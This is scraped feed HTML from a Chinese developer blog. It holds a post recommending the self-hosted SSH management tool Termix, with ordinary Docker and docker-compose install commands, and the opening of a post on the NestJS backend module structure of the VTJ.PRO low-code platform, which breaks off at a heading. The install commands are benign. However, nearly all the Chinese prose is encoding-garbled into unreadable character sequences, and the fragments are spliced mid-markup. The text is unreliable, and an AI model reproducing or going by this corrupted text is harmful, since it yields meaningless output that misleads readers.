data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ <code>Javaé™ˆåºå‘˜</code>ã€‚</p>
<p>åœ¨ä¼ä¸šå¼€å‘ä¸­ï¼Œä½ æ˜¯å¦æœ‰é‡åˆ°è¿‡å¦‚ä¸‹éš¾é¢˜ï¼šç®¡ç† 3 å°æœåŠ¡å™¨éœ€è¦åŒæ—¶æ‰“å¼€ç»ˆç«¯å·¥å…·ã€æ–‡ä»¶ä¼ è¾“è½¯ä»¶å’Œç›‘æ§é¢æ¿ï¼Œåˆ‡æ¢çª—å£çš„æ—¶é—´æ¯”å®é™…æ“ä½œè¿˜å¤šï¼›å‡ºé—¨åœ¨å¤–æƒ³ä¸´æ—¶è°ƒæ•´é…ç½®ï¼Œæ‰‹æœºä¸Šå´æ‰¾ä¸åˆ°èƒ½æµç•…è¿è¡Œçš„ SSH å®¢æˆ·ç«¯ï¼›å›¢é˜Ÿåä½œæ—¶ï¼ŒæœåŠ¡å™¨è¿æ¥ä¿¡æ¯åœ¨ Excel å’ŒèŠå¤©è®°å½•é‡Œæ‚ä¹±å †æ”¾ï¼Œå®‰å…¨æ€§æ— ä»è°ˆèµ·ï¼Ÿ</p>
<p>ä»Šå¤©ï¼Œç»™å¤§å®¶æ¨èä¸€æ¬¾å¼€æºã€å…¨å¹³å°å¯ç”¨çš„æœåŠ¡å™¨ç®¡ç†åˆ©å™¨ï¼Œè¿ç»´å¿…å¤‡ï¼</p>
<h2 data-id="heading-0">é¡¹ç›®ä»‹ç»</h2>
<p><code>Termix</code> â€”â€” ä¸€ä¸ªå¼€æºã€æ°¸ä¹…å…è´¹ã€è‡ªæ‰˜ç®¡çš„ä¸€ä½“åŒ–æœåŠ¡å™¨ç®¡ç†å¹³å°ï¼Œé€šè¿‡ä¸€ä¸ªç›´è§‚çš„ç•Œé¢ç®¡ç†æœåŠ¡å™¨å’ŒåŸºç¡€è®¾æ–½ï¼ŒåŒæ—¶æä¾› SSH ç»ˆç«¯è®¿é—®ã€SSH éš§é“åŠŸèƒ½ä»¥åŠè¿œç¨‹æ–‡ä»¶ç®¡ç†ç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e28e5f42f7654202a6598e1ad8840e3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=vBowHfcMhXnFDUeRQ0vk4tsw5uI%3D" alt="" loading="lazy"/></p>
<p><strong>åŠŸèƒ½ç‰¹è‰²</strong>ï¼š</p>
<ul>
<li><strong>å…¨èƒ½ SSH ç»ˆç«¯ä¸è¿æ¥ç®¡ç†</strong>ï¼šåŠŸèƒ½é½å…¨çš„ç»ˆç«¯ï¼Œæ”¯æŒåˆ†å±æ“ä½œï¼›æ”¯æŒåˆ›å»ºå¯é‡ç”¨çš„å‘½ä»¤ç‰‡æ®µï¼Œå¯åœ¨å¤šä¸ªæ‰“å¼€çš„ç»ˆç«¯ä¸ŠåŒæ—¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼›æ”¯æŒè·³æ¿æœºã€warpgateã€åŸºäº TOTP çš„è¿æ¥ç­‰</li>
<li><strong>å¯è§†åŒ–çš„è¿œç¨‹æ–‡ä»¶ç®¡ç†</strong>ï¼šæ”¯æŒç›´æ¥æµè§ˆç¼–è¾‘ä»£ç ã€å›¾ç‰‡ã€éŸ³è§†é¢‘ç­‰æ–‡ä»¶ï¼Œä»£ç æ–‡ä»¶è‡ªåŠ¨è¯†åˆ« 20 + ç¼–ç¨‹è¯­è¨€å¹¶é«˜äº®æ˜¾ç¤ºï¼›æ”¯æŒæ‹–æ‹½ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶ã€æ‰¹é‡é‡å‘½åã€ç§»åŠ¨ç­‰æ“ä½œ</li>
<li><strong>å…¨é¢çš„æœåŠ¡å™¨ç›‘æ§</strong>ï¼šé€šè¿‡ä»ªè¡¨ç›˜ç›´è§‚åœ°å±•ç¤º SSH æœåŠ¡å™¨çš„ CPUã€å†…å­˜ã€ç£ç›˜ä½¿ç”¨ç‡ã€ç½‘ç»œæµé‡ä¸ç³»ç»Ÿè¿è¡Œæ—¶é—´ç­‰ä¿¡æ¯</li>
<li><strong>å®‰å…¨ä¸éšç§ä¿éšœ</strong>ï¼šå…·å¤‡å®‰å…¨çš„ç”¨æˆ·ç®¡ç†ï¼Œæ”¯æŒ OIDC è®¤è¯ä¸ 2FAï¼ˆTOTPï¼‰åŒé‡éªŒè¯ï¼Œæ‰€æœ‰ä¿¡æ¯å­˜å‚¨åœ¨æœ¬åœ°åŠ å¯† SQLite æ•°æ®åº“ï¼Œæ— éœ€æ‹…å¿ƒæ•°æ®æ³„éœ²çš„é£é™©</li>
<li><strong>å…¨å¹³å°æ— ç¼ä½“éªŒ</strong>ï¼šç½‘é¡µç«¯ã€æ¡Œé¢ç«¯ï¼ˆWindows/Linux/macOSï¼‰ã€ç§»åŠ¨ç«¯ï¼ˆiOS/Androidï¼‰å…¨æ”¯æŒï¼ŒåŒæ—¶ä¸€å¤„é…ç½®ï¼Œå¤šç«¯åŒæ­¥ä½¿ç”¨ï¼Œé€‚åº”å›ºå®šåŠå…¬ä¸ç§»åŠ¨è¿ç»´åœºæ™¯</li>
<li><strong>ç°ä»£ç•Œé¢è®¾è®¡</strong>ï¼šåŸºäº Reactã€Tailwind CSS å’Œ Shadcn æ„å»ºçš„ç®€æ´çš„æ¡Œé¢/ç§»åŠ¨è®¾å¤‡å‹å¥½ç•Œé¢ï¼Œå†…ç½®è‹±è¯­ã€ä¸­æ–‡ã€å¾·è¯­ã€è‘¡è„ç‰™è¯­ï¼Œæœ¬åœ°åŒ–ä½“éªŒå‹å¥½</li>
</ul>
<h2 data-id="heading-1">å¿«é€Ÿä¸Šæ‰‹</h2>
<p><code>Termix</code> æ”¯æŒç½‘ç«™ã€Windowsã€Linuxã€macOSã€iOS/iPadOSã€Android å¤šå¹³å°ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-2">å®‰è£…åŒ…å®‰è£…</h3>
<p>1ã€æ‰“å¼€ä¸‹è½½åœ°å€</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/Termix-SSH/Termix/releases
</code></pre>
<p>2ã€ä¸‹è½½å¯¹åº”æ“ä½œç³»ç»Ÿçš„å®‰è£…åŒ…</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e82f95131bf4763918cc675a1d8085d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=qUyVvGaFTBU%2BOnKYn9g4JY4V0nI%3D" alt="" loading="lazy"/></p>
<p>3ã€è§£å‹å¹¶å®‰è£…</p>
<h3 data-id="heading-3">Docker éƒ¨ç½²</h3>
<p>1ã€æ‹‰å–é•œåƒ</p>
<pre><code class="hljs language-bash" lang="bash">docker pull ghcr.io/lukegus/termix:latest
</code></pre>
<p>2ã€åˆ›å»ºæŒ‚è½½ç›®å½•</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p /data/software/termix
</code></pre>
<p>3ã€è¿è¡Œå®¹å™¨</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d --name termix \
	-p 8080:8080 \
	-v /data/software/termix:/app/data \
	-e PORT=8080 \
	ghcr.io/lukegus/termix:latest
</code></pre>
<p>4ã€å®¹å™¨è¿è¡ŒæˆåŠŸåï¼Œæµè§ˆå™¨è®¿é—®</p>
<pre><code class="hljs language-bash" lang="bash">http://{IP/åŸŸå}:8080
</code></pre>
<blockquote>
<p><strong>é¦–æ¬¡æ³¨å†Œçš„ç”¨æˆ·å³ä¸ºé»˜è®¤ç®¡ç†å‘˜</strong>ã€‚</p>
</blockquote>
<h3 data-id="heading-4">Docker Compose éƒ¨ç½²</h3>
<p>1ã€åˆ›å»º <code>docker-compose.yml</code> æ–‡ä»¶</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">services:</span>
  <span class="hljs-attr">termix:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">ghcr.io/lukegus/termix:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">termix</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/data/software/termix:/app/data</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">PORT:</span> <span class="hljs-string">"8080"</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">termix-data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
</code></pre>
<p>2ã€è¿è¡Œå¯åŠ¨</p>
<pre><code class="hljs language-bash" lang="bash">docker compose up -d
</code></pre>
<h2 data-id="heading-5">åŠŸèƒ½ä½“éªŒ</h2>
<ul>
<li><strong>ä»ªè¡¨æ¿</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8487bb42c8b34593a9b695bf0474fde8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=wG1HjRfn4LqH1%2Br%2F%2BwI%2FwRWse1o%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>ä¸»æœºç®¡ç†</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3ef9cd725204c99b5fccc41068104d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=vEhkGBM4nTwmV%2F31RG%2BjwQidIYY%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>SSH è¿æ¥</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f57d6192f836420ba16f2481803edb8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=h7SY0huniQBf3DQnGu%2BWQXeMUgk%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>æ–‡ä»¶ç®¡ç†</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84e26548ab084b47b2f6891610b01e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=czibgjAej8suOuKYL2l9uhV1tgA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>æœåŠ¡å™¨çŠ¶æ€ä»ªè¡¨ç›˜</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b88caffbf37e4dfea53f080a737dfded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=%2BNe05kJFY8vwOojD4S6057eO%2BMI%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>ç®¡ç†å‘˜è®¾ç½®</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05d0864b865341dc8e354bcc7790591b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YemZiOW6j-WRmA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768526385&amp;x-signature=asWVPNU2fZ4yh3U6k2hDjpxCxKQ%3D" alt="" loading="lazy"/></p>
<p>æ— è®ºæ˜¯ä¸ªäººå¼€å‘è€…ç®¡ç†æœåŠ¡å™¨ï¼Œè¿˜æ˜¯ä¼ä¸šè¿ç»´å›¢é˜Ÿç®¡æ§é›†ç¾¤ï¼ŒTermix éƒ½èƒ½å¤§å¹…ç®€åŒ–å·¥ä½œæµç¨‹ã€‚å¦‚æœä½ ç»å¸¸éœ€è¦ç®¡ç†è¿œç¨‹æœåŠ¡å™¨ï¼ŒTermix ç»å¯¹å€¼å¾—ä¸€è¯•ï¼Œå¿«å»å®‰è£…è¯•è¯•å§~</p>
<pre><code class="hljs language-bash" lang="bash">é¡¹ç›®åœ°å€ï¼šhttps://github.com/Termix-SSH/Termix
</code></pre>
<h2 data-id="heading-6">æœ€å</h2>
<p>æ¨èçš„å¼€æºé¡¹ç›®å·²ç»æ”¶å½•åˆ° <code>GitHub</code> é¡¹ç›®ï¼Œæ¬¢è¿ <code>Star</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/chenyl8848/great-open-source-project
</code></pre>
<p>æˆ–è€…è®¿é—®ç½‘ç«™ï¼Œè¿›è¡Œåœ¨çº¿æµè§ˆï¼š</p>
<pre><code class="hljs language-bash" lang="bash">https://chencoding.top:8090/<span class="hljs-comment">#/</span>
</code></pre>
<blockquote>
<p>å¤§å®¶çš„ç‚¹èµã€æ”¶è—å’Œè¯„è®ºéƒ½æ˜¯å¯¹ä½œè€…çš„æ”¯æŒï¼Œå¦‚æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©è¿˜è¯·ç‚¹èµè½¬å‘æ”¯æŒä¸‹ï¼Œè°¢è°¢ï¼</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VTJ.PROã€ŒAI + ä½ä»£ç ã€åº”ç”¨å¼€å‘å¹³å°çš„åç«¯æ¨¡å—ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7592876744526315570</link>    <guid>https://juejin.cn/post/7592876744526315570</guid>    <pubDate>2026-01-09T01:43:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744526315570" data-draft-id="7592833068224397358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VTJ.PROã€ŒAI + ä½ä»£ç ã€åº”ç”¨å¼€å‘å¹³å°çš„åç«¯æ¨¡å—ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½,ä½ä»£ç "/> <meta itemprop="datePublished" content="2026-01-09T01:43:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸©ç€ä¸¤æ¡è™«"/> <meta itemprop="url" content="https://juejin.cn/user/4141239932051488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VTJ.PROã€ŒAI + ä½ä»£ç ã€åº”ç”¨å¼€å‘å¹³å°çš„åç«¯æ¨¡å—ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4141239932051488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸©ç€ä¸¤æ¡è™«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T01:43:22.000Z" title="Fri Jan 09 2026 01:43:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ç›®çš„ä¸èŒƒå›´</h3>
<p>æœ¬æ–‡æ¡£æè¿°äº†åŸºäºNestJSçš„VTJ.PROåç«¯æ¨¡å—æ¶æ„ã€‚å®ƒæ¶µç›–äº†æ¨¡å—ç»„ç»‡ç»“æ„ã€ä¾èµ–æ³¨å…¥æ¨¡å¼ã€TypeORMé›†æˆä»¥åŠä¸šåŠ¡é€»è¾‘åœ¨æ ¸å¿ƒæ¨¡å—å’Œä¸šåŠ¡æ¨¡å—ä¸­çš„ç»„ç»‡æ–¹å¼ã€‚æœ¬æ–‡æ¡£ä¾§é‡äºåç«¯çš„ç»“æ„ç»„ç»‡ï¼›å…·ä½“ä¸šåŠ¡åŠŸèƒ½è¯·å‚è§ä½ä»£ç åº”ç”¨ç³»ç»Ÿã€LLMç®¡ç†ç³»ç»Ÿå’Œç”¨æˆ·ç®¡ç†ä¸å®‰å…¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fb51b25b4eb4c7c85ea97fe9af1c036~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=3rs7b3CJuiBdUXXIQ8w9a2yvi4o%3D" alt="iShot_2026-01-04_15.59.29.png" loading="lazy"/></p>
<h2 data-id="heading-1">NestJSæ¨¡å—æ¶æ„æ¦‚è¿°</h2>
<p>åç«¯ä½¿ç”¨NestJSä½œä¸ºåº”ç”¨æ¡†æ¶ï¼Œå°†ä»£ç ç»„ç»‡æˆå°è£…ç›¸å…³åŠŸèƒ½çš„æ¨¡å—ã€‚æ¯ä¸ªæ¨¡å—éƒ½æ˜¯ä¸€ä¸ªç”¨<code>@Module()</code>è£…é¥°å™¨è£…é¥°çš„ç±»ï¼ŒåŒ…å«ä»¥ä¸‹å…ƒæ•°æ®ï¼š</p>
<ul>
<li>imports: è¯¥æ¨¡å—ä¾èµ–çš„å…¶ä»–æ¨¡å—</li>
<li>controllers: HTTPè¯·æ±‚å¤„ç†å™¨</li>
<li>providers: æœåŠ¡ã€ä»“åº“å’Œå…¶ä»–å¯æ³¨å…¥ç±»</li>
<li>exports: æä¾›ç»™å…¶ä»–æ¨¡å—ä½¿ç”¨çš„æœåŠ¡/æä¾›è€…</li>
<li>æ ¹æ¨¡å—<code>AppModule</code>ä½äº<code>backend/src/app.module.ts</code></li>
</ul>
<p>åè°ƒæ‰€æœ‰åŠŸèƒ½æ¨¡å—å¹¶é…ç½®å…¨å±€åŸºç¡€è®¾æ–½ï¼Œå¦‚æ•°æ®åº“è¿æ¥ã€è°ƒåº¦å’Œå®ˆå«ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51cb68ba50c04fa4897a9942eab3ca6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=JLL%2FWIcvS1zUvUZ%2BfSeFegMm6UU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">æ¨¡å—ç»„ç»‡ç»“æ„</h2>
<p>åç«¯ç»„ç»‡ä¸ºä¸¤ä¸ªä¸»è¦ç±»åˆ«ï¼š</p>
<h3 data-id="heading-3">æ ¸å¿ƒæ¨¡å—</h3>
<p>ä½äº<code>backend/src/core/</code>ï¼Œæä¾›åŸºç¡€å¹³å°æœåŠ¡ï¼š</p>























































<table><thead><tr><th>æ¨¡å—</th><th>ç›®çš„</th><th>å¯¼å‡º</th></tr></thead><tbody><tr><td><code>UserModule</code></td><td>ç”¨æˆ·ç®¡ç†å’Œè®¤è¯</td><td><code>UserService</code>,Â <code>OAuthService</code></td></tr><tr><td><code>RoleModule</code></td><td>è§’è‰²ç®¡ç†</td><td><code>RoleService</code></td></tr><tr><td><code>PermissionModule</code></td><td>æƒé™å®šä¹‰å’Œæ£€æŸ¥</td><td><code>PermissionService</code>,Â <code>TypeOrmModule</code></td></tr><tr><td><code>CacheModule</code></td><td>Redis/å†…å­˜ç¼“å­˜</td><td><code>CacheService</code></td></tr><tr><td><code>DictionaryModule</code></td><td>é…ç½®æ•°æ®ç®¡ç†</td><td><code>DictionaryService</code></td></tr><tr><td><code>SettingModule</code></td><td>ç³»ç»Ÿè®¾ç½®</td><td><code>SettingService</code></td></tr><tr><td><code>LLMModelModule</code></td><td>LLMæä¾›è€…é…ç½®</td><td><code>LLMModelService</code></td></tr><tr><td><code>OssModule</code></td><td>å¯¹è±¡å­˜å‚¨é›†æˆ</td><td><code>OssFactoryService</code></td></tr><tr><td><code>EmailVerificationModule</code></td><td>é‚®ç®±éªŒè¯æµç¨‹</td><td><code>EmailVerificationService</code></td></tr></tbody></table>
<h3 data-id="heading-4">ä¸šåŠ¡æ¨¡å—</h3>
<p>ä½äº<code>backend/src/business/</code>ï¼Œå®ç°ç‰¹å®šé¢†åŸŸåŠŸèƒ½ï¼š</p>























































<table><thead><tr><th>æ¨¡å—</th><th>ç›®çš„</th><th>å¯¼å‡º</th></tr></thead><tbody><tr><td><code>LowcodeAppModule</code></td><td>åº”ç”¨ç®¡ç†</td><td><code>AppService</code></td></tr><tr><td><code>TemplateModule</code></td><td>æ¨¡æ¿ç®¡ç†</td><td><code>TemplateService</code></td></tr><tr><td><code>DSLModule</code></td><td>DSLé…ç½®</td><td><code>DSLService</code></td></tr><tr><td><code>OrderModule</code></td><td>è®¢å•äº¤æ˜“</td><td><code>OrderService</code></td></tr><tr><td><code>ProductModule</code></td><td>äº§å“ç›®å½•</td><td><code>ProductService</code></td></tr><tr><td><code>ReportModule</code></td><td>åˆ†ææŠ¥å‘Š</td><td><code>ReportService</code></td></tr><tr><td><code>DailyModule</code></td><td>è¿è¥æŠ¥å‘Š</td><td><code>DailyService</code></td></tr><tr><td><code>AgentModule</code></td><td>AIä»£ç†æœåŠ¡</td><td><code>AgentService</code></td></tr><tr><td><code>OpenModule</code></td><td>å…¬å…±API</td><td>-</td></tr></tbody></table>
<h2 data-id="heading-5">æ ¹æ¨¡å—é…ç½®</h2>
